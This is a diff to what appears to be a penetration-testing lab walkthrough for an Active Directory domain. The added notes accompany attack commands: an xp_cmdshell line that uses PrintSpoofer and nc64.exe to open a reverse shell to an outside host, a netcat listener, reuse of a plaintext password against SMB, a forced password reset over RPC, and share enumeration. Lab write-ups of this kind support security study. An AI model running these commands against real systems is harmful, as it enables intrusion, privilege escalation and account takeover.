@@ -1430,13 +1430,19 @@ adding the .exe estension to upload PrintSpoofer64.exe and nc64.exe
 
 ![](./dev01/5.png)
 
+Browse to **`/admin/file-management`**
 uploading nc and printSpoofer
 
+![](./dev01/6.png)
+
+Trigger it at **`/Portals/0`**
 ```sql
 xp_cmdshell 'c:\dotnetnuke\portals\0\PrintSpoofer64.exe -c "c:\dotnetnuke\portals\0\nc64.exe 172.16.8.120 9001 -e cmd"';
 ```
 
-![](./dev01/6.png)
+![](./dev01/7.png)
+
+Shell as nt authority:
 
 ```
 $ nc -lvnp 9001
@@ -1637,6 +1643,8 @@ Secret  : _SC_SQLTELEMETRY$SQLEXPRESS / service 'SQLTELEMETRY$SQLEXPRESS' with u
 
 ```
 
+Looking for users:
+
 ```
 dir c:\users
  Volume in drive C has no label.
@@ -1658,6 +1666,8 @@ dir c:\users
                0 File(s)              0 bytes
               11 Dir(s)  31,526,375,424 bytes free
 ```
+
+Testing the discovered password on local users reveals that the password works on hporter:
 
 ```
 nxc smb 172.16.8.3 -u hporter -p Gr8hambino! --shares
@@ -1687,6 +1697,10 @@ INFO: Compressing output into 20261113132230_bloodhound.zip
 
 
 ## ForcePasswordREset acl
+
+![](./bh/1.png)
+
+Changing ssmalls password:
 
 ```bash
 net rpc password "ssmalls" 'Password123!' -U "INLANEFREIGHT.LOCAL"/"hporter"%'Gr8hambino!' -S DC01 
@@ -1782,8 +1796,9 @@ SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\back
                                                                                               
 ```
 
-useless account
+useless account (see if if its worth keeping)
 
+ssmalls is member 
 ```bash
 smbmap -u ssmalls -p Password123! -H 172.16.8.3 -r 'Department Shares' --depth 5
 
